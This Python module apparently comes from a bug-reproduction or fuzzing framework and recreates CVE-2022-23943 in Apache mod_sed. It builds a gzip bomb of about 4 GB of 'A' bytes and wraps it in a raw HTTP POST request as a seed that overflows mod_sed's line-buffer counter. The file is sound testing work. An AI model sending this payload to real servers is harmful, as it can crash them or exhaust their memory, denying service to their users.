"""CVE-2022-23943 - Integer overflow in mod_sed line buffer.

The payload compresses ~4 GB of ``'A'`` bytes into ~4 MB of gzip.
When mod_deflate inflates it and feeds the result through mod_sed,
the line buffer in ``sed1.c`` overflows its unsigned-int size counter
at 2^32.
"""

import gzip
import io
from pathlib import Path

from apatchy.bugs.base import Bug
from apatchy.utils.logger import get_logger

logger = get_logger(__name__)


class CVE_2022_23943(Bug):
    """Integer overflow in mod_sed line buffer."""

    def setup(self) -> None:
        """Create the DocumentRoot with a target HTML file."""
        htdocs = Path("/tmp/htdocs")
        htdocs.mkdir(exist_ok=True)
        target = htdocs / "in.html"
        if not target.exists():
            target.write_text("<html></html>")
            logger.info(f"Created {target}")

    def generate_seeds(self) -> None:
        """Generate a gzip-bomb seed that triggers the integer overflow."""
        seeds_dir = self.seeds_dir
        seeds_dir.mkdir(exist_ok=True)
        seed_path = seeds_dir / "seed.txt"

        if seed_path.exists():
            logger.info(f"{seed_path} already exists, skipping")
            return

        logger.info("generating gzip bomb seed...")

        # Create gzip bomb: "A" * 0xFFFFFFFF (~4 GB)
        data = b"A" * 0xFFFFFFFF

        buf = io.BytesIO()
        with gzip.GzipFile(fileobj=buf, mode="wb", compresslevel=9) as f:
            f.write(data)

        compressed = buf.getvalue()
        logger.debug(f"compressed size: {len(compressed)}")

        # Build raw HTTP request
        request = (
            f"POST /in.html HTTP/1.1\r\n"
            f"Host: localhost\r\n"
            f"Content-Encoding: gzip\r\n"
            f"Content-Type: application/octet-stream\r\n"
            f"Content-Length: {len(compressed)}\r\n"
            f"\r\n"
        ).encode() + compressed

        seed_path.write_bytes(request)
        logger.info(f"wrote {seed_path}")

    def clean(self) -> None:
        """Remove generated seeds and htdocs."""
        super().clean()
        htdocs = Path("/tmp/htdocs")
        if htdocs.exists():
            import shutil

            shutil.rmtree(htdocs)
            logger.info(f"Removed {htdocs}")
